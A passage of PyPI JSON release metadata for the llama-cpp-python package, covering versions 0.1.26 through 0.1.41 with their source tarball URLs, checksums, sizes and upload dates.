llama.cpp","version":"0.1.26","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c1cfc81b3ba5340398820cc12c247e33f3f1ee15c4043794596968dc31ebac9c","md5":"c7c826618c4f6fd435caf2d63ebde7e6","sha256":"2ceca8d3f2f76341f9ba112762b069cfc242cdaf390a2a5d0faee7ac63add07a"},"downloads":-1,"filename":"llama_cpp_python-0.1.26.tar.gz","has_sig":false,"md5_digest":"c7c826618c4f6fd435caf2d63ebde7e6","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":529312,"upload_time":"2023-04-08T07:14:01","upload_time_iso_8601":"2023-04-08T07:14:01.003768Z","url":"https://files.pythonhosted.org/packages/c1/cf/c81b3ba5340398820cc12c247e33f3f1ee15c4043794596968dc31ebac9c/llama_cpp_python-0.1.26.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.27":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.27/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.27","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fab80a6fafae31b2c40997c282cd9220743c419dd8b372f09c57e551792bb899","md5":"e42a3d48231d52c044f714004c39249b","sha256":"f43e5ee4a0886f7a5fae0cb585e4d61a43726d5aab3ea7004363fdfec0d878ff"},"downloads":-1,"filename":"llama_cpp_python-0.1.27.tar.gz","has_sig":false,"md5_digest":"e42a3d48231d52c044f714004c39249b","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":529306,"upload_time":"2023-04-08T19:14:00","upload_time_iso_8601":"2023-04-08T19:14:00.180747Z","url":"https://files.pythonhosted.org/packages/fa/b8/0a6fafae31b2c40997c282cd9220743c419dd8b372f09c57e551792bb899/llama_cpp_python-0.1.27.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.28":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.28/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.28","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fb6a0c7421119d6e536ee1ca02ad5555dbbda7a38189333b0ac67f582cd5a84f","md5":"19c04f5224b568e01dede3b6b734c7b2","sha256":"38e8e4dac018cc21e49acb865a70e492f314c25f92041ae242d6f34cbe0f88c6"},"downloads":-1,"filename":"llama_cpp_python-0.1.28.tar.gz","has_sig":false,"md5_digest":"19c04f5224b568e01dede3b6b734c7b2","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":142901,"upload_time":"2023-04-10T02:39:34","upload_time_iso_8601":"2023-04-10T02:39:34.679153Z","url":"https://files.pythonhosted.org/packages/fb/6a/0c7421119d6e536ee1ca02ad5555dbbda7a38189333b0ac67f582cd5a84f/llama_cpp_python-0.1.28.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.29":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.29/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.29","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fae33a12c770007f9a3c5903f7e2904aff4af5fa7d36cb06843c65cfaadccdd2","md5":"eed4790ac3253b993025693b8c3ad756","sha256":"d24b7e20e0c6525129258112fc3face6844b9eadb7ebfa509e11f1ea14ab3fd0"},"downloads":-1,"filename":"llama_cpp_python-0.1.29.tar.gz","has_sig":false,"md5_digest":"eed4790ac3253b993025693b8c3ad756","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1049576,"upload_time":"2023-04-10T04:53:00","upload_time_iso_8601":"2023-04-10T04:53:00.332759Z","url":"https://files.pythonhosted.org/packages/fa/e3/3a12c770007f9a3c5903f7e2904aff4af5fa7d36cb06843c65cfaadccdd2/llama_cpp_python-0.1.29.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.3":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.3/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.3","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"13a2a3a6e665905992e2ed2c79b7af2dce4a36f23c5147959f0f56d9bd72543c","md5":"d3c42c3d68fefb5527e4b28b3e1fdedc","sha256":"b47b1d42e370ed253be0ef7a6722890b8241b721f3bb70e458498a5a0107d4f9"},"downloads":-1,"filename":"llama_cpp_python-0.1.3.tar.gz","has_sig":false,"md5_digest":"d3c42c3d68fefb5527e4b28b3e1fdedc","packagetype":"sdist","python_version":"source","requires_python":null,"size":521941,"upload_time":"2023-03-24T19:00:47","upload_time_iso_8601":"2023-03-24T19:00:47.325020Z","url":"https://files.pythonhosted.org/packages/13/a2/a3a6e665905992e2ed2c79b7af2dce4a36f23c5147959f0f56d9bd72543c/llama_cpp_python-0.1.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.30":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.30/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.30","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e58eb8dfcb10fdb1b2556a688cb23fd3d1b7b60c2b24ddc1cb9fc61a915c94d0","md5":"6befa611716fdd5a03ef6ef136b2e423","sha256":"f283c0f6ef3502924421cb710ae984e5ff1a65202d3a4fadcdfe6285c3df05f4"},"downloads":-1,"filename":"llama_cpp_python-0.1.30.tar.gz","has_sig":false,"md5_digest":"6befa611716fdd5a03ef6ef136b2e423","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1049736,"upload_time":"2023-04-10T06:14:22","upload_time_iso_8601":"2023-04-10T06:14:22.224576Z","url":"https://files.pythonhosted.org/packages/e5/8e/b8dfcb10fdb1b2556a688cb23fd3d1b7b60c2b24ddc1cb9fc61a915c94d0/llama_cpp_python-0.1.30.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.31":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.31/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.31","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c946e37f0120bf5996b644c373c8fea9d2bf31ceb30e18724f2ae0876cb25b96","md5":"490fab9d8a971f42c445a71ba1d2100a","sha256":"696d8415e415755daffd93854160e4ed5be1c45397dbe07ab11e65811ef36f56"},"downloads":-1,"filename":"llama_cpp_python-0.1.31.tar.gz","has_sig":false,"md5_digest":"490fab9d8a971f42c445a71ba1d2100a","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1050167,"upload_time":"2023-04-10T15:39:21","upload_time_iso_8601":"2023-04-10T15:39:21.100633Z","url":"https://files.pythonhosted.org/packages/c9/46/e37f0120bf5996b644c373c8fea9d2bf31ceb30e18724f2ae0876cb25b96/llama_cpp_python-0.1.31.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.32":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.32/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.32","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"39f29d9c98ccb9ffe2ca7c9aeef235d5e45a4694f3148dfc9559e672c346f6ea","md5":"b5eb3a2ff3aa217c1b006dd3037b9bd5","sha256":"d2b7494ea56ea70f684927744a404747f615bcd8728d618a03398ea8e937a83d"},"downloads":-1,"filename":"llama_cpp_python-0.1.32.tar.gz","has_sig":false,"md5_digest":"b5eb3a2ff3aa217c1b006dd3037b9bd5","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1050237,"upload_time":"2023-04-10T16:58:30","upload_time_iso_8601":"2023-04-10T16:58:30.396190Z","url":"https://files.pythonhosted.org/packages/39/f2/9d9c98ccb9ffe2ca7c9aeef235d5e45a4694f3148dfc9559e672c346f6ea/llama_cpp_python-0.1.32.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.33":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.33/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.33","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"70b3a1497e783b921cc8cd0d2f7fabe9d0b5c2bf95ab9fd56503d282862ce720","md5":"0f22e0828addff1aaf0583348eafb565","sha256":"0a3692f0ba0324d1b35c0bef4c0f9769c70a548a84c7ec1e41fb3fd9d5698ba0"},"downloads":-1,"filename":"llama_cpp_python-0.1.33.tar.gz","has_sig":false,"md5_digest":"0f22e0828addff1aaf0583348eafb565","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1052650,"upload_time":"2023-04-13T04:43:38","upload_time_iso_8601":"2023-04-13T04:43:38.104850Z","url":"https://files.pythonhosted.org/packages/70/b3/a1497e783b921cc8cd0d2f7fabe9d0b5c2bf95ab9fd56503d282862ce720/llama_cpp_python-0.1.33.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.34":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.34/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.34","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b3f082690e424b3fdb0d1738f312095a7a88cbe06cb910be9c5f5d4c7e3bdde8","md5":"a0f5dcd18f07b0af38e547edfa4ec847","sha256":"36e0565b9abaa18cfbffdaf627ca26e778cfd777ea60754114568f41695bd82d"},"downloads":-1,"filename":"llama_cpp_python-0.1.34.tar.gz","has_sig":false,"md5_digest":"a0f5dcd18f07b0af38e547edfa4ec847","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1060317,"upload_time":"2023-04-16T02:30:56","upload_time_iso_8601":"2023-04-16T02:30:56.930440Z","url":"https://files.pythonhosted.org/packages/b3/f0/82690e424b3fdb0d1738f312095a7a88cbe06cb910be9c5f5d4c7e3bdde8/llama_cpp_python-0.1.34.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.35":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.35/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.35","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e947013240af1272400ad49422f8ebfc47476a4d82e3375dd05dbd1440da3c50","md5":"59893b107b43dda1ea784b00fe145652","sha256":"efeba88e4f7d78a4829e8ba011dc60a1a32e26b834f69e0a06a760c03056543a"},"downloads":-1,"filename":"llama_cpp_python-0.1.35.tar.gz","has_sig":false,"md5_digest":"59893b107b43dda1ea784b00fe145652","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1071997,"upload_time":"2023-04-20T05:52:48","upload_time_iso_8601":"2023-04-20T05:52:48.046324Z","url":"https://files.pythonhosted.org/packages/e9/47/013240af1272400ad49422f8ebfc47476a4d82e3375dd05dbd1440da3c50/llama_cpp_python-0.1.35.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.36":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.36/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.36","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1bea3f2aff10fd7195c6bc8c52375d9ff027a551151569c50e0d47581b14b7c1","md5":"d97367303285c1fa7a711e65e5b5af3f","sha256":"2ec96f88f9a9217f19f70345004ffb9f49bd453be1cadbbd86dd9d4018f9de8c"},"downloads":-1,"filename":"llama_cpp_python-0.1.36.tar.gz","has_sig":false,"md5_digest":"d97367303285c1fa7a711e65e5b5af3f","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1076762,"upload_time":"2023-04-22T00:00:45","upload_time_iso_8601":"2023-04-22T00:00:45.555422Z","url":"https://files.pythonhosted.org/packages/1b/ea/3f2aff10fd7195c6bc8c52375d9ff027a551151569c50e0d47581b14b7c1/llama_cpp_python-0.1.36.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.37":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.37/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.37","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"5d10e037dc290ed7435dd6f5fa5dcce2453f1cf145b84f1e8e40d0a63ac62aa2","md5":"f98509bb8ef988c63e32541450cded4b","sha256":"3e98375fcb20fcbd2c8ad39c615f114fa1b0b565236f3e06c9d47aaee76b336e"},"downloads":-1,"filename":"llama_cpp_python-0.1.37.tar.gz","has_sig":false,"md5_digest":"f98509bb8ef988c63e32541450cded4b","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1088280,"upload_time":"2023-04-25T04:21:33","upload_time_iso_8601":"2023-04-25T04:21:33.103760Z","url":"https://files.pythonhosted.org/packages/5d/10/e037dc290ed7435dd6f5fa5dcce2453f1cf145b84f1e8e40d0a63ac62aa2/llama_cpp_python-0.1.37.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.38":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.38/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.38","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e62ad898551013b9f0863b8134dbcb5863a306f5d9c2ad4a394c68a2988a77a0","md5":"51a917d53eb5fbc5372113ed35194b4f","sha256":"a060078c2b3ad7bb0b0b4b7a3f43d269c4687b2e774a85db8f9ad06bf4a3d889"},"downloads":-1,"filename":"llama_cpp_python-0.1.38.tar.gz","has_sig":false,"md5_digest":"51a917d53eb5fbc5372113ed35194b4f","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1088316,"upload_time":"2023-04-25T05:41:14","upload_time_iso_8601":"2023-04-25T05:41:14.786481Z","url":"https://files.pythonhosted.org/packages/e6/2a/d898551013b9f0863b8134dbcb5863a306f5d9c2ad4a394c68a2988a77a0/llama_cpp_python-0.1.38.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.39":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.39/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.39","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"5a41955ac2e592949ca95a29efc5f544afcbc9ca3fc5484cb0272837d98c6b5a","md5":"ab36e1656229cdb100913102b016f315","sha256":"6df7f81e58da56da7716b0a836eeb962e7f7e969e3ac9a4fd6376c3545e8ee17"},"downloads":-1,"filename":"llama_cpp_python-0.1.39.tar.gz","has_sig":false,"md5_digest":"ab36e1656229cdb100913102b016f315","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1109232,"upload_time":"2023-04-28T19:44:31","upload_time_iso_8601":"2023-04-28T19:44:31.793271Z","url":"https://files.pythonhosted.org/packages/5a/41/955ac2e592949ca95a29efc5f544afcbc9ca3fc5484cb0272837d98c6b5a/llama_cpp_python-0.1.39.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.4":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.4/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.4","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"00b63069b31e8cd0073685aa059e161e4b8dc3a4e3c77c4f8f433fa5ebc01655","md5":"f7047c7f4ce0f908f8adcfffca6a45f2","sha256":"7f90728cd0da94e6b917469cad286cb226309cb14c4c16676aed0a610f175083"},"downloads":-1,"filename":"llama_cpp_python-0.1.4.tar.gz","has_sig":false,"md5_digest":"f7047c7f4ce0f908f8adcfffca6a45f2","packagetype":"sdist","python_version":"source","requires_python":null,"size":533616,"upload_time":"2023-03-24T22:44:29","upload_time_iso_8601":"2023-03-24T22:44:29.934714Z","url":"https://files.pythonhosted.org/packages/00/b6/3069b31e8cd0073685aa059e161e4b8dc3a4e3c77c4f8f433fa5ebc01655/llama_cpp_python-0.1.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.40":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.40/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.40","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fc2c62c5ce16f88348f928320565cf6c0dfe8220a03615bff14e47e4f3b4e439","md5":"7bb24b0c547b412f1ebf664900d6bc58","sha256":"4f4391e88458a0a234d03e1a6b6b1285d29ca1030e7f5e76ad9b50a1dc940fef"},"downloads":-1,"filename":"llama_cpp_python-0.1.40.tar.gz","has_sig":false,"md5_digest":"7bb24b0c547b412f1ebf664900d6bc58","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1124822,"upload_time":"2023-05-01T19:47:35","upload_time_iso_8601":"2023-05-01T19:47:35.477472Z","url":"https://files.pythonhosted.org/packages/fc/2c/62c5ce16f88348f928320565cf6c0dfe8220a03615bff14e47e4f3b4e439/llama_cpp_python-0.1.40.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.41":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.41/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.41","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d1fe852d447828bdcdfe1c8aa88061517b5de9e5c12389dd852076d5c913936a","md5":"9fa9ab85ca9793ba8c367cac29d224ec","sha256":"f37f96cb4bd14e43d9dd5b21797d8128a66d984f68c27db3b6a0d085b76f644d"},"downloads":-1,"filename":"llama_cpp_python-0.1.41.tar.gz","has_sig":false,"md5_digest":"9fa9ab85ca9793ba8c367cac29d224ec","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1124851,"upload_time":"2023-05-02T02:54:38","upload_time_iso_8601":"2023-05-02T02:54:38.781416Z","url":"https://files.pythonhosted.org/packages/d1/fe/852d447828bdcdfe1c8aa88061517b5de9e5c12389dd852076d5c913936a/llama_cpp_python-0.1.41.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.42":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming 